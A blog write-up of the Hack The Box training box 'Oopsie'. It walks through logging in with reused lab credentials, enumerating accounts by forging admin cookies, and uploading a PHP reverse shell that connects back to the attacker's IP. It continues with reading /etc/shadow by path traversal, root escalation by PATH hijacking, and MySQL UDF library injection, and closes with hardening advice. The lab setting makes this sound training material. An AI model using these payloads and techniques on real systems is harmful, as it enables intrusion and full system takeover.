## HTB Starting Point: Oopsie

`Oopsie` is a 2nd box from Starting Point path on [Hack The Box](https://app.hackthebox.eu/). This path is composed of 9 boxes in a way that later boxes use information (like credentials) gathered from the previous ones.

This box features debugging session and MySQL enumeration.

# Website (:80)

![3254609819658.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359800980/jdk3ZSWZW.png)

At the bottom of the page we see that it should have some login front.

![2472539506300.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359817919/Am9HmkO-2.png)

By looking at the a source code we can find where the login page is located (also we can see that in the `nikto` output):

![908940052778.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359831242/Jv6crvP9e.png)

## `/cdn-cgi/login/`

![5109588867122.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359847886/GhsDCS7I8.png)

Here, in the source code, apart from the following JS script we don't see anything useful.
![4759601737308.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364874715/Q1Qn91i2X.png)

Ok, now that we don't have any clues about credentials we can use - but let's try some of these from the [Archetype](/htb-starting-point-archetype) box.

`admin/MEGACORP_4dm1n!!` is the answer.

![1054904841448.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364889827/5Twexim-r.png)

On the top navigation bar there is an `Upload` page - this is something we should check right away for possible reverse shell uploads.

## `/cdn-cgi/login/admin.php?content=uploads`

![558202605415.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364913275/lb2_8hCNo.png)

That's an interesting one. We come back here after we enumerate users

## `/cdn-cgi/login/admin.php?content=accounts&id=1`

![1095069701766.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364925916/szOTLgtDO.png)

Using the Developer Tools (F12) we can peek the request and cookies:

![2626903306530.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364935593/iYSZPxsvR.png)

Let's enumerate the `id` query parameter to discover some users.

```py
# account_enum.py

import requests
import urllib3
import re
from tabulate import tabulate

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

host = "10.10.10.28"
url = f"http://{host}/cdn-cgi/login/admin.php?content=accounts&id="

headers = {}
cookies = {"user":"34322", "role":"admin"}

t_header = ["ID", "Name", "Email"]
t_matches = []

re_pattern = "<table><tr><th>Access ID</th><th>Name</th><th>Email</th></tr><tr><td>(?P<ID>.+)</td><td>(?P<Name>.+)</td><td>(?P<Email>.+)</td></tr></table"

for i in range(100):
    r = requests.get(f"{url}{i}", cookies=cookies, headers=headers, verify=False)

    match = re.search(re_pattern, r.text)

    if match != None:
        t_matches.append([match["ID"], match["Name"], match["Email"]])

print(tabulate(t_matches, t_header))
```

![2874780499364.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364950772/ycUiVDp9y.png)

Ok, so when we replace the cookies with `super admin` account details, we should be able to see the `Uploads` page.

![5332291816323.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364965952/0cXR4ZlM0.png)

# Exploiting (user shell)

First, we can try the simplest payload:

```php
# pshell.php

<?php
$sock=fsockopen("10.10.XX.XXX",4445);
$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

![1921633931166.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365280394/-TBb8QrQq.png)

Let's see `curl http://10.10.10.28/uploads/pshell.php`

Yup, reverse shell obtained.

```
$ alias ls='ls --color=always -lAh'

# Lateral movement

Now we can try to reuse DB credentials to switch shell user.

## `bugtracker` group

This group is not a standard one. We should be curious about such creations. By using `find` command, we can easily track down all files to which group have special permissions to.

```sh
find / -group bugtracker 2>/dev/null
```

![2070396192989.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365099494/cCAKRJWIK.png)

Interesting. It looks like some custom application. Lets `strace` it.

```
$ strace bugtracker
```

![4200016117802.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365117358/gNCyZ7ReC.png)

It is waiting for the input - type anything and hit enter. Later down the stack, we see that application permissions are temporarily elevated to the root permissions
![4973533837197.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365133849/6GSgTqfHc.png)

And following path is `cat` out.

![686007484704.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365143886/JCf-UyJoC.png)

It is even better visible by using `ltrace`
![3389142210754.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365157248/2eU3vAADGz.png)

> New to `strace` and `ltrace`? Check my other write-up: [Passphrase](/cyber-apocalypse-2021-passphrase)

Application is trying to cat the file out. Using directory traversal, we can read the shadow file.

```
robert@oopsie:/var/www/html/uploads$ bugtracker
```

![3058473057245.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365171297/KkxVY24ck.png)

And try to crack `root` password it with `john`:

```
$ unshadow passwd.txt shadow.txt > unshadowed.txt
$ john --wordlist=/usr/wl/rockyou.txt unshadowed.txt

Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:53:11 DONE (2021-05-30 15:45) 0g/s 4493p/s 4493c/s 4493C/s !!!playboy!!!7..*7Â¡Vamos!
Session completed

```

But we can't crack it. At this point, we can simply cat out the root flag

![5787352694397.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365183455/t7okXooRh.png)

But let's assume we don't know where the flag lays.

# Escalating Privileges

> ðŸ”” `CyberEthical.Me` is maintained purely from your donations - if you would like to boost the community, consider one-time sponsoring on the [Sponsor](/sponsor) button or [become a Patron](https://www.patreon.com/bePatron?u=57522747) which also gives you some bonus perks.

In the debugging sessions, we see that `cat` is not referenced via an absolute `/bin/cat` path. We can exploit that.
The plan is to modify `PATH` variable to include directory, so it will be searched **before** `/bin/`. In this directory, we are going to create `cat` file that will call `/bin/bash`. As we've observed before, `cat` (whatever it may be) is run with temporary elevated privileges - that way we can get the root shell.

```
export PATH=/tmp:$PATH
cd /tmp/
echo '/bin/sh' > cat
chmod +x cat
```

![5171782624492.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365197956/aO8bq7lYB.png)

That way, we have a `cat` executable file that will be called inside `bugtracker` instead `/bin/cat`.
![241768606964.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365212772/522mfcLCe.png)

![5116127633069.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365221444/Kv95Zqvyi.png)

Remember that because we have modified `cat` in a `PATH` we should, either unset the `/tmp:` or call `cat` via its absolute path.

# Post-exploitation

When you read the reports in the `/root/reports` you will see many references to the `filezilla` and its config. It happens that `.config` directory actually exists in the `/root`

![817353914711.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365239164/y83wv9QVX.png)

Alright - another credential to save.

```
echo 'ftpuser|mc@F1l3ZilL4' | tee -a ../.credentials
```

## MySQL

Let's see what we can get by using `robert` account with `mysql`.

![129463566212.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365248899/2dhqCl_8I.png)

## Arbitrary Library Injection (rabbit hole?)

* [Super_priv](https://dev.mysql.com/doc/refman/5.6/en/privileges-provided.html#priv_super)

This exploit is abusing user privileges to INSERT and DELETE on 'mysql'
administrative database, so it is possible to use a library located in an arbitrary
directory. We can use it to prepare a library with `do_system` function to execute shell commands with root privileges.

> For more detailed steps, please refer to [MySQL Arbitrary Library Injection @ Wisec.It](http://www.wisec.it/vulns.php?page=5).

For a quick wrap up - I did manage to upload the library payload and add its path to `mysql.func` table. 

```
INSERT INTO mysql.func (name,dl) VALUES ('do_system','/var/lib/mysql-files/lib_mysqludf_sys.so');
```

The last step was restarting the MySQL server - which I could have done on user account partially. Following will shut down the MySQL...

```
CREATE FUNCTION exit RETURNS INTEGER SONAME 'libc.so.6';
SELECT exit(0);
```

... but I didn't find a way to start it again. Maybe it is not possible?

# Hardening Ideas

## Use absolute paths to the binaries

Using relative paths, you are creating a vulnerability that could potentially lead to executing malicious code and in the worst scenario cause privilege escalation.

## Principle of Least Privilege

On this MySQL instance, too many accounts have Priv_system permissions. Always start from the least privileged permission and add more of them as needed.

## Don't reuse passwords

This advice probably is applicable to all Starting Point boxes, as they are created such intentionally - but it's good to spotlight it.
